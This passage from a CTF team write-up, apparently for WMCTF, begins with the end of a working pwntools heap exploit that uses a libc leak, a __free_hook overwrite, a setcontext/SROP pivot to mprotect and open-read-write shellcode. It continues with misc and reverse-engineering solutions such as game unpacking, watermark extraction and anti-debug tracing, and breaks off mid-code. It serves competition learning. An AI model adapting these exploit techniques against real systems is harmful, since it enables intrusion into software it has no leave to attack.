+</span></span><span class=line><span class=cl>	<span class=n>gdb</span><span class=o>.</span><span class=n>attach</span><span class=p>(</span><span class=n>p</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=c1>#	pause()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>game_start</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>	<span class=n>r</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s1>&#39; &gt;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>8</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mi>4</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>	<span class=n>p</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s1>&#39; &gt;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>8</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mi>4</span><span class=p>))</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>add_free</span><span class=p>(</span><span class=n>size</span><span class=p>,</span><span class=n>content1</span><span class=p>,</span><span class=n>content2</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>	<span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s1>&#39; &gt;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>8</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mi>8</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>	<span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s1>&#39; &gt;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>8</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mi>8</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>	<span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s1>&#39;size: &#39;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=n>size</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>	<span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s1>&#39;size: &#39;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=n>size</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>	<span class=n>p</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s1>&#39; want to say? &#39;</span><span class=p>,</span><span class=n>content2</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>	<span class=n>r</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s1>&#39; want to say? &#39;</span><span class=p>,</span><span class=n>content1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>	
+</span></span><span class=line><span class=cl><span class=n>start</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=n>game_start</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=n>add_free</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x10</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mh>0xc71</span><span class=p>),</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x10</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mh>0xc71</span><span class=p>))</span>
+</span></span><span class=line><span class=cl><span class=n>game_start</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=n>add_free</span><span class=p>(</span><span class=mh>0xF0</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;leave: &#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>leak</span><span class=o>=</span><span class=n>u64</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\x7F</span><span class=s1>&#39;</span><span class=p>)[</span><span class=o>-</span><span class=mi>6</span><span class=p>:]</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span>
+</span></span><span class=line><span class=cl><span class=nb>print</span> <span class=nb>hex</span><span class=p>(</span><span class=n>leak</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>libc_base1</span><span class=o>=</span><span class=n>leak</span><span class=o>-</span><span class=mi>1569</span><span class=o>-</span><span class=mh>0x10</span><span class=o>-</span><span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s1>&#39;__malloc_hook&#39;</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>free_hook1</span> <span class=o>=</span> <span class=n>libc_base1</span><span class=o>+</span><span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s1>&#39;__free_hook&#39;</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s1>&#39;LIBC1:</span><span class=se>\t</span><span class=s1>&#39;</span> <span class=o>+</span> <span class=nb>hex</span><span class=p>(</span><span class=n>libc_base1</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;leave: &#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>leak</span><span class=o>=</span><span class=n>u64</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\x7F</span><span class=s1>&#39;</span><span class=p>)[</span><span class=o>-</span><span class=mi>6</span><span class=p>:]</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span>
+</span></span><span class=line><span class=cl><span class=nb>print</span> <span class=nb>hex</span><span class=p>(</span><span class=n>leak</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>libc_base2</span><span class=o>=</span><span class=n>leak</span><span class=o>-</span><span class=mi>1569</span><span class=o>-</span><span class=mh>0x10</span><span class=o>-</span><span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s1>&#39;__malloc_hook&#39;</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>free_hook2</span> <span class=o>=</span> <span class=n>libc_base2</span><span class=o>+</span><span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s1>&#39;__free_hook&#39;</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s1>&#39;LIBC2:</span><span class=se>\t</span><span class=s1>&#39;</span> <span class=o>+</span> <span class=nb>hex</span><span class=p>(</span><span class=n>libc_base2</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>game_start</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=n>add_free</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=s1>&#39;U&#39;</span><span class=o>*</span><span class=mh>0x10</span><span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mh>0x51</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>libc_base1</span><span class=o>+</span><span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s1>&#39;__free_hook&#39;</span><span class=p>]),</span><span class=s1>&#39;U&#39;</span><span class=o>*</span><span class=mh>0x10</span><span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mh>0x51</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>libc_base2</span><span class=o>+</span><span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s1>&#39;__free_hook&#39;</span><span class=p>]))</span>
+</span></span><span class=line><span class=cl><span class=n>game_start</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=n>add_free</span><span class=p>(</span><span class=mh>0xF0</span><span class=p>,</span><span class=s1>&#39;U&#39;</span><span class=o>*</span><span class=mh>0x10</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mh>0x51</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>libc_base1</span><span class=o>+</span><span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s1>&#39;__free_hook&#39;</span><span class=p>]),</span><span class=s1>&#39;U&#39;</span><span class=o>*</span><span class=mh>0x10</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mh>0x51</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>libc_base2</span><span class=o>+</span><span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s1>&#39;__free_hook&#39;</span><span class=p>]))</span>
+</span></span><span class=line><span class=cl><span class=n>game_start</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=n>new_execve_env1</span> <span class=o>=</span> <span class=n>free_hook1</span> <span class=o>&amp;</span> <span class=mh>0xFFFFFFFFFFFFF000</span>
+</span></span><span class=line><span class=cl><span class=n>shellcode1</span> <span class=o>=</span> <span class=s1>&#39;&#39;&#39;
+</span></span></span><span class=line><span class=cl><span class=s1>xor rdi, rdi
+</span></span></span><span class=line><span class=cl><span class=s1>mov rsi, </span><span class=si>%d</span><span class=s1>
+</span></span></span><span class=line><span class=cl><span class=s1>mov edx, 0x1000
+</span></span></span><span class=line><span class=cl><span class=s1>
+</span></span></span><span class=line><span class=cl><span class=s1>mov eax, 0
+</span></span></span><span class=line><span class=cl><span class=s1>syscall
+</span></span></span><span class=line><span class=cl><span class=s1>
+</span></span></span><span class=line><span class=cl><span class=s1>jmp rsi
+</span></span></span><span class=line><span class=cl><span class=s1>&#39;&#39;&#39;</span> <span class=o>%</span> <span class=n>new_execve_env1</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>new_execve_env2</span> <span class=o>=</span> <span class=n>free_hook2</span> <span class=o>&amp;</span> <span class=mh>0xFFFFFFFFFFFFF000</span>
+</span></span><span class=line><span class=cl><span class=n>shellcode2</span> <span class=o>=</span> <span class=s1>&#39;&#39;&#39;
+</span></span></span><span class=line><span class=cl><span class=s1>xor rdi, rdi
+</span></span></span><span class=line><span class=cl><span class=s1>mov rsi, </span><span class=si>%d</span><span class=s1>
+</span></span></span><span class=line><span class=cl><span class=s1>mov edx, 0x1000
+</span></span></span><span class=line><span class=cl><span class=s1>
+</span></span></span><span class=line><span class=cl><span class=s1>mov eax, 0
+</span></span></span><span class=line><span class=cl><span class=s1>syscall
+</span></span></span><span class=line><span class=cl><span class=s1>
+</span></span></span><span class=line><span class=cl><span class=s1>jmp rsi
+</span></span></span><span class=line><span class=cl><span class=s1>&#39;&#39;&#39;</span> <span class=o>%</span> <span class=n>new_execve_env2</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>orw</span> <span class=o>=</span> <span class=s1>&#39;&#39;&#39;
+</span></span></span><span class=line><span class=cl><span class=s1>mov rax, 0x67616c662f2e ;// ./flag
+</span></span></span><span class=line><span class=cl><span class=s1>push rax
+</span></span></span><span class=line><span class=cl><span class=s1>
+</span></span></span><span class=line><span class=cl><span class=s1>mov rdi, rsp ;// ./flag
+</span></span></span><span class=line><span class=cl><span class=s1>mov rsi, 0 ;// O_RDONLY
+</span></span></span><span class=line><span class=cl><span class=s1>xor rdx, rdx ;// 置0就行
+</span></span></span><span class=line><span class=cl><span class=s1>mov rax, 2 ;// SYS_open
+</span></span></span><span class=line><span class=cl><span class=s1>syscall
+</span></span></span><span class=line><span class=cl><span class=s1>
+</span></span></span><span class=line><span class=cl><span class=s1>mov rdi, rax ;// fd 
+</span></span></span><span class=line><span class=cl><span class=s1>mov rsi,rsp  ;// 读到栈上
+</span></span></span><span class=line><span class=cl><span class=s1>mov rdx, 1024 ;// nbytes
+</span></span></span><span class=line><span class=cl><span class=s1>mov rax,0 ;// SYS_read
+</span></span></span><span class=line><span class=cl><span class=s1>syscall
+</span></span></span><span class=line><span class=cl><span class=s1>
+</span></span></span><span class=line><span class=cl><span class=s1>mov rdi, 1 ;// fd 
+</span></span></span><span class=line><span class=cl><span class=s1>mov rsi, rsp ;// buf
+</span></span></span><span class=line><span class=cl><span class=s1>mov rdx, rax ;// count 
+</span></span></span><span class=line><span class=cl><span class=s1>mov rax, 1 ;// SYS_write
+</span></span></span><span class=line><span class=cl><span class=s1>syscall
+</span></span></span><span class=line><span class=cl><span class=s1>
+</span></span></span><span class=line><span class=cl><span class=s1>mov rdi, 0 ;// error_code
+</span></span></span><span class=line><span class=cl><span class=s1>mov rax, 60
+</span></span></span><span class=line><span class=cl><span class=s1>syscall
+</span></span></span><span class=line><span class=cl><span class=s1>&#39;&#39;&#39;</span>
+</span></span><span class=line><span class=cl><span class=n>payload1</span>  <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc_base1</span> <span class=o>+</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;setcontext&#39;</span><span class=p>]</span> <span class=o>+</span> <span class=mi>53</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>free_hook1</span> <span class=o>+</span> <span class=mh>0x10</span><span class=p>)</span> <span class=o>+</span> <span class=n>asm</span><span class=p>(</span><span class=n>shellcode1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>payload1</span> <span class=o>=</span> <span class=n>payload1</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x30</span><span class=p>,</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>frame</span> <span class=o>=</span> <span class=n>SigreturnFrame</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=n>frame</span><span class=o>.</span><span class=n>rsp</span> <span class=o>=</span> <span class=n>free_hook1</span> <span class=o>+</span> <span class=mi>8</span>
+</span></span><span class=line><span class=cl><span class=n>frame</span><span class=o>.</span><span class=n>rip</span> <span class=o>=</span> <span class=n>libc_base1</span> <span class=o>+</span> <span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s1>&#39;mprotect&#39;</span><span class=p>]</span> <span class=c1># 0xa8 rcx</span>
+</span></span><span class=line><span class=cl><span class=n>frame</span><span class=o>.</span><span class=n>rdi</span> <span class=o>=</span> <span class=n>free_hook1</span> <span class=o>&amp;</span><span class=mh>0xFFFFFFFFFFFFF000</span>
+</span></span><span class=line><span class=cl><span class=n>frame</span><span class=o>.</span><span class=n>rsi</span> <span class=o>=</span> <span class=mh>0x1000</span>
+</span></span><span class=line><span class=cl><span class=n>frame</span><span class=o>.</span><span class=n>rdx</span> <span class=o>=</span> <span class=mi>4</span> <span class=o>|</span> <span class=mi>2</span> <span class=o>|</span> <span class=mi>1</span>
+</span></span><span class=line><span class=cl><span class=n>payload1</span> <span class=o>+=</span> <span class=nb>str</span><span class=p>(</span><span class=n>frame</span><span class=p>)[</span><span class=mh>0x30</span><span class=p>:</span><span class=mh>0xD8</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>payload2</span>  <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc_base2</span> <span class=o>+</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;setcontext&#39;</span><span class=p>]</span> <span class=o>+</span> <span class=mi>53</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>free_hook2</span> <span class=o>+</span> <span class=mh>0x10</span><span class=p>)</span> <span class=o>+</span> <span class=n>asm</span><span class=p>(</span><span class=n>shellcode2</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>payload2</span> <span class=o>=</span> <span class=n>payload2</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x30</span><span class=p>,</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>frame</span> <span class=o>=</span> <span class=n>SigreturnFrame</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=n>frame</span><span class=o>.</span><span class=n>rsp</span> <span class=o>=</span> <span class=n>free_hook2</span> <span class=o>+</span> <span class=mi>8</span>
+</span></span><span class=line><span class=cl><span class=n>frame</span><span class=o>.</span><span class=n>rip</span> <span class=o>=</span> <span class=n>libc_base2</span> <span class=o>+</span> <span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s1>&#39;mprotect&#39;</span><span class=p>]</span> <span class=c1># 0xa8 rcx</span>
+</span></span><span class=line><span class=cl><span class=n>frame</span><span class=o>.</span><span class=n>rdi</span> <span class=o>=</span> <span class=n>free_hook2</span> <span class=o>&amp;</span><span class=mh>0xFFFFFFFFFFFFF000</span>
+</span></span><span class=line><span class=cl><span class=n>frame</span><span class=o>.</span><span class=n>rsi</span> <span class=o>=</span> <span class=mh>0x1000</span>
+</span></span><span class=line><span class=cl><span class=n>frame</span><span class=o>.</span><span class=n>rdx</span> <span class=o>=</span> <span class=mi>4</span> <span class=o>|</span> <span class=mi>2</span> <span class=o>|</span> <span class=mi>1</span>
+</span></span><span class=line><span class=cl><span class=n>payload2</span> <span class=o>+=</span> <span class=nb>str</span><span class=p>(</span><span class=n>frame</span><span class=p>)[</span><span class=mh>0x30</span><span class=p>:</span><span class=mh>0xD8</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>add_free</span><span class=p>(</span><span class=mh>0xF0</span><span class=p>,</span><span class=n>payload1</span><span class=p>,</span><span class=n>payload2</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>asm</span><span class=p>(</span><span class=n>orw</span><span class=p>))</span>
+</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
+</span></span></code></pre></div><h2 id=misc>Misc</h2><h3 id=dalabengba>Dalabengba</h3><p>先用EnigmaVBUnpacker.exe将游戏解包
+<img class=blog-post__image src=https://hackmd.summershrimp.com/uploads/upload_f40cca716ad4cccb72861350a9b79c3e.png alt loading=lazy decoding=async>
+然后开启rpgmaker开一个新项目，把www里面文件拷过去打开
+<img class=blog-post__image src=https://hackmd.summershrimp.com/uploads/upload_b3e744e636152849dc783d0ff598e507.png alt loading=lazy decoding=async>
+在这个网站把素材解包https://petschko.org/tools/mv_decrypter/，把完整的放回文件夹里，这里要修改data/system.json的配置
+&ldquo;hasEncryptedImages&rdquo;: false,
+&ldquo;hasEncryptedAudio&rdquo;: false,
+运行正常使用了
+<img class=blog-post__image src=https://hackmd.summershrimp.com/uploads/upload_0280daf918a26ff67cafd0d76c9745e5.png alt loading=lazy decoding=async>
+查找了国王最后成功的话
+<img class=blog-post__image src=https://hackmd.summershrimp.com/uploads/upload_5db1d582c9cd1710e90fd9de5e605019.png alt loading=lazy decoding=async>
+调试发现还是加密了，用了decText.js里面代码
+参考<a href="http://cache.baiducontent.com/c?m=9d78d513d98303fa4fece4215e4f80260e55f0744cd2c7647dc3923884155f563662f4cb51356704c7823c390ef50f1aa8b12173441e3df2de8d9f4aaae3c97b73c97d73671cf1104f8c04edd64727c621900cb8f81cb3eea6&amp;amp;p=c96fc64ad48c11a058e8d6654948&amp;amp;newp=92769a47cd8911a058e8872b445c92695c02dc3051ddd001298ffe0cc4241a1a1a3aecbb24241502d9c478610abb0f31aba7747d605f76acd1&amp;amp;s=cfcd208495d565ef&amp;amp;user=baidu&amp;amp;fm=sc&amp;amp;query=RPGMAKER%B7%C0%C6%C6%BD%E2&amp;amp;qid=f601feaf00042d52&amp;amp;p1=1">RPGMaker防破解百度快照</a>
+去分析rpg_core.js，推出systemkey:&ldquo;f74592328a168cf858e727078d4f6ab&rdquo;，然后丢回包里看国王说的话，其实可以把所有发现加密的都跑出来看看有哪些东西
+<img class=blog-post__image src=https://images-cdn.shimo.im/V0etRC2WJpTzNdys__thumbnail.PNG alt loading=lazy decoding=async>
+emm好像没flag
+第一部分：</p><p>直接跳到最后的天空城关卡
+<img class=blog-post__image src=https://hackmd.summershrimp.com/uploads/upload_44b8b47e88c65b64871b31003e28c45e.png alt loading=lazy decoding=async>
+发现移动路线组成单词Pr1nCe5s
+第二部分：
+文件part2.jpg
+前面有一个do you know java ，查了java和图片隐写的东西
+找打java盲水印工具：https://github.com/ww23/BlindWatermark，
+需要拼接一部分，扫描出第二部分
+<img class=blog-post__image src=https://hackmd.summershrimp.com/uploads/upload_66fa2c8058debf0be49712ab229dc1ad.png alt loading=lazy decoding=async>
+W@rR1or</p><p>第三部分：
+前面导入systemkey后使用加密的素材
+<img class=blog-post__image src=https://hackmd.summershrimp.com/uploads/upload_36ef3f2933fd61a8f638cbfa7bb0197a.png alt loading=lazy decoding=async>
+看到国王的话逆序hex->ascii得到Y0u_@re_5o_bRaVE得到一个文件
+<img class=blog-post__image src=https://hackmd.summershrimp.com/uploads/upload_238ca188ca474387ad33958b4cbff3be.png alt loading=lazy decoding=async>
+搜文件名s3cr3t找到了个解密的https://gist.github.com/aanoaa/1408846
+出了WhrRrrr~
+<img class=blog-post__image src=https://hackmd.summershrimp.com/uploads/upload_0d910504a7ecb5dfa598b63708415bb9.png alt loading=lazy decoding=async></p><h3 id=xman_happy_birthday>XMAN_Happy_birthday!</h3><p>翻转</p><h3 id=music_game>Music_game</h3><p>声控游戏，走到终点就出flag</p><h2 id=rev>Rev</h2><h3 id=wmware>Wmware</h3><p><strong>Second Blood</strong></p><p>一个bochs,磁盘文件,010打开后看到了熟悉的0x55AA,拖入ida,选择16位.扇区是512字节为一个单位,这样可以找到一些代码,简单分析了一下发现是在输入,循环等待不停等待端口状态变化,然后读入,这里获得的是键盘的扫描码,转成了ascii,写到了显存的地址</p><p>用bochs自带的调试器调一下,在输入的时候中断,输入的跳出条件是读到回车的扫描码,继续调试,结合ida,发现他在进行一个6*6的循环,每次拿出来一个扫描码.加0x55后放到另外一个地方,有点像栅栏密码,后面切换模式到32位,运行保护模式的代码,这里可以开一个32位的ida,直接F5,发现循环xor了几个很臭的常数,选择臭常数的条件是循环的次数取余9,全部都是xor,写逆运算计算回来就行了</p><h3 id=welcome-to-ctf>Welcome to CTF</h3><p>一个windows逆向,一开始踩坑到了虚假的执行流,虚假的base64,虚假的xor,在init的时候,运行了好多函数,关于异常反调试等等,还有三处调用了ntdll里面的一个可以对抗调试器的函数.</p><p>既然这样,那就直接上trace了,手头有一个写好的工具,配合qemu,trace出了他所有的指令流
+<img class=blog-post__image src=https://hackmd.summershrimp.com/uploads/upload_eb1e6150524146d82f47f963b35c4a87.png alt loading=lazy decoding=async>
+发现到这里了,跟进去看了一下,和假的那个函数差不多,直接逆了一下,发现有一个改了表的base64函数,后面是几个明显的大数计算,这里直接patch了他的ntdll那个函数的调用,可以调试了,在进入虚假的check函数时,修改eip到这个函数,手动跳过来,继续调试</p><p>整理出来大概的流程:
+base64decode -> rsa -> 高60bit和低56bit分别做x y,计算x^3 + y^3 + z^3 = 43
+这里的一个常数值是立方和=42的解,这里却还是43,先带进去42的结果生成一下flag,然后跑trace.
+算了一下发现是错的,继续边trace边打印内存,发现base64的结果就不对了,但是log里还是有那个函数的痕迹的,继续查log,发现在初始化码表后,decode之前,有一个函数跳走了.那就是这里的问题了,读了一下码表,发现和直接dump出来的不一样,修了一下码表,最后又一次trace,发现已经输出GOOD了,估计那个43最后还是被改过,不过已经出了就没继续trace了.</p><h3 id=easy_re>easy_re</h3><p><strong>Second Blood</strong></p><p>调试得到perl源码</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$flag = &#34;WMCTF{I_WAnt_dynam1c_F1ag}&#34;
+</span></span><span class=line><span class=cl>print &#34;please input the flag:&#34;;
+</span></span><span class=line><span class=cl>$line = &lt;STDIN&gt;;
+</span></span><span class=line><span class=cl>chomp($line);
+</span></span><span class=line><span class=cl>if($line eq $flag){
+</span></span><span class=line><span class=cl>print &#34;congratulation!&#34;
+</span></span><span class=line><span class=cl>}else{&#39;
+</span></span><span class=line><span class=cl>print &#34;no,wrong&#34;&#39;
+</span></span><span class=line><span class=cl>}
+</span></span></code></pre></div><h3 id=meet_in_july>Meet_in_July</h3><p><strong>First Blood</strong></p><p><img class=blog-post__image src=https://hackmd.summershrimp.com/uploads/upload_adfc7becae87af10ef6798f13fe703ee.png alt loading=lazy decoding=async>
+check格式flag{}长度70
+数字和大写ABCDEF
+<img class=blog-post__image src=https://hackmd.summershrimp.com/uploads/upload_933b2c51cb597137690981f9004ce0d5.png alt loading=lazy decoding=async>
+字符串转16进制后进sub_401909进行加密
+<img class=blog-post__image src=https://hackmd.summershrimp.com/uploads/upload_b0b0102d285e2209705ad6e60fcbf3dd.png alt loading=lazy decoding=async>
+主要是乘法减法mod三个操作</p><p>因为sub_401111操作结果都是32bytes，猜测是一个取模操作。</p><p>用了两组数据算出了模数：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Util.number</span> <span class=kn>import</span> <span class=n>GCD</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>inp_1</span> <span class=o>=</span> <span class=mh>0x1790fc4efe2923a51ea676027908f3670d509bd2db7d6f45e38f6dc0258697415aaff6dd5ca9006aead7b3ea053c115aabd618bcdea5ca109dab2555e8e62a566a06666b81753587d2c92fab5e0254d62320a508222420415b0cc681cdda98</span>
+</span></span><span class=line><span class=cl><span class=n>out_1</span> <span class=o>=</span> <span class=n>bytes_to_long</span><span class=p>(</span><span class=nb>bytes</span><span class=p>([</span>
+</span></span><span class=line><span class=cl>    <span class=mh>0xF4</span><span class=p>,</span> <span class=mh>0x56</span><span class=p>,</span> <span class=mh>0x29</span><span class=p>,</span> <span class=mh>0xCE</span><span class=p>,</span> <span class=mh>0xB3</span><span class=p>,</span> <span class=mh>0x4D</span><span class=p>,</span> <span class=mh>0x25</span><span class=p>,</span> <span class=mh>0xBD</span><span class=p>,</span> <span class=mh>0xD4</span><span class=p>,</span> <span class=mh>0xC2</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=mh>0xED</span><span class=p>,</span> <span class=mh>0xDA</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0xB2</span><span class=p>,</span> <span class=mh>0x67</span><span class=p>,</span> <span class=mh>0xDF</span><span class=p>,</span> <span class=mh>0x8E</span><span class=p>,</span> <span class=mh>0xBB</span><span class=p>,</span> <span class=mh>0x5F</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=mh>0x1F</span><span class=p>,</span> <span class=mh>0x6D</span><span class=p>,</span> <span class=mh>0x5A</span><span class=p>,</span> <span class=mh>0x2F</span><span class=p>,</span> <span class=mh>0x3D</span><span class=p>,</span> <span class=mh>0x85</span><span class=p>,</span> <span class=mh>0xE8</span><span class=p>,</span> <span class=mh>0xF3</span><span class=p>,</span> <span class=mh>0x8F</span><span class=p>,</span> <span class=mh>0x45</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=mh>0xB3</span><span class=p>,</span> <span class=mh>0x6F</span><span class=p>][::</span><span class=o>-</span><span class=mi>1</span><span class=p>]))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>inp_2</span> <span class=o>=</span> <span class=n>bytes_to_long</span><span class=p>(</span><span class=nb>bytes</span><span class=p>([</span><span class=mh>0x11</span><span class=p>]</span><span class=o>*</span><span class=mi>33</span><span class=p>))</span>
+</span></span><span class=line><span class=cl><span class=n>out_2</span> <span class=o>=</span> <span class=n>bytes_to_long</span><span class=p>(</span><span class=nb>bytes</span><span class=p>([</span>
